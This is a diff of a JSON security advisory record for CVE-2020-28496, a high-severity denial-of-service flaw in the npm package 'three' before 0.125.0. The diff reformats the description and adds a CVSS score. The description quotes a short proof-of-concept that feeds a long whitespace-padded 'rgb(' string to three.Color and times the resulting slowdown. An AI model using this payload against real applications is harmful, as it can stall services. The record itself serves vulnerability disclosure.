@@ -1,6 +1,6 @@
 {
   "Severity": "HIGH",
-  "UpdatedAt": "2021-02-24T07:40:54Z",
+  "UpdatedAt": "2023-09-11T16:30:56Z",
   "Package": {
     "Ecosystem": "NPM",
     "Name": "three"
@@ -39,16 +39,16 @@
         "Value": "CVE-2020-28496"
       }
     ],
-    "Description": "This affects the package three before 0.125.0. This can happen when handling rgb or hsl colors. PoC: var three = require('three') function build_blank (n) { var ret = \"rgb(\" for (var i = 0; i \u003c n; i++) { ret += \" \" } return ret + \"\"; } var Color = three.Color var time = Date.now(); new Color(build_blank(50000)) var time_cost = Date.now() - time; console.log(time_cost+\" ms\")",
+    "Description": "This affects the package three before 0.125.0. This can happen when handling rgb or hsl colors. \n\n**PoC:** \n```js\nvar three = require('three')\nfunction build_blank(n) {\n    var ret = \"rgb(\"\n    for (var i = 0; i \u003c n; i++) {\n        ret += \" \"\n    }\n    return ret + \"\";\n}\nvar Color = three.Color\nvar time = Date.now();\nnew Color(build_blank(50000)) var time_cost = Date.now() - time;\nconsole.log(time_cost + \" ms\")\n```",
     "Origin": "UNSPECIFIED",
     "PublishedAt": "2021-03-01T19:57:16Z",
     "Severity": "HIGH",
     "Summary": "Denial of service in three",
-    "UpdatedAt": "2023-02-01T05:05:06Z",
+    "UpdatedAt": "2023-09-11T16:30:56Z",
     "WithdrawnAt": "",
     "CVSS": {
-      "Score": 0,
-      "VectorString": ""
+      "Score": 7.5,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
     }
   },
   "Versions": [
